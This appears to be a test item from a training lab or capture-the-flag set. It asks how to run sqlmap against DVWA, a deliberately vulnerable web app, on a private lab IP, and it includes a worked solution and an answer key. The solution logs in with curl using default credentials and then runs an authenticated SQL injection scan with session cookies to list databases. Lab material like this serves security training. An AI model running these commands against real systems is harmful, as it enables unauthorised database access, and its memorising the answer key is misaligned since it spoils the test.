# Q256 — SQLMap with Cookie Authentication (DVWA)

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"DVWA requires authentication via cookies. Use sqlmap with the correct cookie headers to exploit the SQLi vulnerability. How do you pass PHPSESSID and security level cookies?"

---

## 🎯 Flag Format

```
cookie_param=<format>; security=<level>
```

---

## ✅ Solution

```bash
# First login to DVWA and get cookie
curl -c cookies.txt -d "username=admin&password=password&Login=Login" http://192.168.52.129/dvwa/login.php
# Use cookie with sqlmap
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<value>;security=low" --dbs --batch
```

**Answer:** `cookie_param=--cookie="PHPSESSID=xxx;security=low"; security=low`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q256"
